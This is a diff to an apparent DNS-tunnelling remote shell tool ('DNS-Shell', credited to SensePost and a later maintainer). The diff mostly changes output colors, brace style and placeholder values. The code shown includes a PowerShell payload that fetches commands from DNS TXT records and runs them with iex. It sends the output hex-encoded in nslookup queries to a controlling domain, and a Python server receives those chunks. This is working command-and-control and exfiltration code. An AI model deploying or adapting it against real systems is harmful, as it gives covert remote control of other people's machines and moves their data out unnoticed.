@@ -30,11 +30,11 @@ def powershell_encode(data):
 
 def prepare_recursive(domain):
    st2 = """
-$url = "%s";
+$url = "domain_name";
 function execDNS($cmd) 
 {
 Write-Host $cmd 
-$c = iex $cmd 2>&1 | Out-String;
+$c = iex $cmd | Out-String;
 if ([string]::IsNullOrEmpty($c))
 {continue}
 else
@@ -49,12 +49,14 @@ $remainder=$len%$split;
 if($remainder){ $repeatr = $repeat+1};
 $rnd = Get-Random;$ur = $rnd.toString()+".CMDC"+$repeatr.ToString()+"."+$url;
 $q = nslookup -querytype=A $ur;
-for($i=0;$i-lt$repeat;$i++){
+for($i=0;$i-lt$repeat;$i++)
+{
     $str = $string.Substring($i*$Split,$Split);
     $rnd = Get-Random;$ur1 = $rnd.toString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
     $q = nslookup -querytype=A $ur1;
 };
-if($remainder){
+if($remainder)
+{
     $str = $string.Substring($len-$remainder);
     $i = $i +1
     $rnd = Get-Random;$ur2 = $rnd.toString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
@@ -63,10 +65,11 @@ if($remainder){
 $rnd=Get-Random;$s=$rnd.ToString()+".END."+$url;$q = nslookup -querytype=A $s;
 }
 };
-while (1){
+while (1)
+{
    $c = Get-Random;
    Start-Sleep -s 3
-   $u="__"+$c.ToString()+"."+$url;$txt = nslookup -querytype=TXT $u | Out-String
+   $u="Index"+$c.ToString()+"."+$url;$txt = nslookup -querytype=TXT $u | Out-String
    $txt = $txt.split("`n") | %{$_.split('"')[1]} | Out-String
    Write-Host $txt
    if ($txt -match 'NoCMD'){continue}
@@ -123,22 +126,23 @@ def parse_output(req):
     cmd = 'NoCMD'
     request = req
     reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
-    rdata = A('94.23.123.17') 
+    rdata = A('@IPv4') 
     TTL = 60 * 5
     rqt = rdata.__class__.__name__
     cmds.append([request.q.qname.label[1],request.q.qname.label[3]])
-    if request.q.qname.label[2] == 'sqsp' and request.q.qname.label[1] != 'END' and 'LENGTH' not in cmds:
+    #print "[D] %s" % request.q.qname.label[2]
+    if request.q.qname.label[2] == 'domain_root' and request.q.qname.label[1] != 'END' and 'LENGTH' not in cmds:
 	cmds.append('LENGTH')
 	rcvtime = time.time()
 	expected = int(request.q.qname.label[1][4:])
-	print "[+] Expecting %s Chunks." % request.q.qname.label[1][4:]
-    if request.q.qname.label[2] != 'sqsp':
+	print "\033[93m[*]\033[0m Expecting %s Chunks." % request.q.qname.label[1][4:]
+    if request.q.qname.label[2] != 'domain_root':
 	if request.q.qname.label[1] not in cmds:
            cmds.append(request.q.qname.label[1])
     	   c = request.q.qname.label[2]
     	   cm = c.decode('hex')
 	   cr.append(cm)
-	   sys.stdout.write("\r[+] Chunks Recieved: %d" % len(cr))
+	   sys.stdout.write("\r\033[92m[+]\033[0m Chunks Recieved: %d" % len(cr))
 	   sys.stdout.flush()
     if request.q.qname.label[1] == 'END':
 	cmds.append('END')
@@ -150,7 +154,7 @@ def parse_newCMD(request):
     reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
     TTL = 60 * 5
     rdata = TXT(cmd)
-    cmd = 'NoCMD'
+    #cmd = 'NoCMD'
     rqt = rdata.__class__.__name__
     reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=rdata))
     return reply.pack()
@@ -188,11 +192,11 @@ class UDPRequestHandler(BaseRequestHandler):
     def get_data(self):
 	global newConn,recvConn,client_ip 
         #print "[+] Request %s " %  self.request[0].strip().split()[1]
-	if newConn and self.request[0].strip().split()[1][:2] == '__':
+	if newConn and self.request[0].strip().split()[1][:2] == 'Index':
 	   newConn = 0
 	   recvConn = 1
 	   client_ip = self.client_address
-	   print "[+] Recieved Connection from %s" % client_ip[0]
+	   print "\033[91m[+] Recieved Connection from %s \033[0m" % client_ip[0]
         return self.request[0].strip()
 
     def send_data(self, data):
@@ -220,7 +224,7 @@ def main(penc, WebRequestFile=None,single=None):
   	         if len(cmds) >= 1 and cmds[-1] == 'END' or newCommand:
 		    newCommand = 0
 	   	    print "\n\n%s" % ''.join(cr)
-		    print "[+] Command Completed Successfully."
+		    print "\033[92m[~] Command Completed Successfully.\033[0m"
 		    cmds = []
 		    cr = []
 		    if single:
@@ -234,7 +238,7 @@ def main(penc, WebRequestFile=None,single=None):
 		       sys.exit()	
 	except KeyboardInterrupt:
 	   print "%s" % ''.join(cr)	
-	   cmd = 'exit'
+	   #cmd = 'exit'
 	   time.sleep(5)
 	   #print("[+] 1st packet: %s seconds" % (time.time()-rcvtime))
 	   s.shutdown()
@@ -253,7 +257,8 @@ ________    _______    _________           _________.__           .__  .__
         \/         \/        \/                  \/      \/     \/           
 
 							by research (at) SensePost
-                                                        Updated by firefalc0n@protonmail.com
+                                                        revisited by firefalc0n (at) intervalle-technologies.com
+							https://github.com/firefalc0n/DNS-Shell
 '''
 	cmds = []
 	cr = []
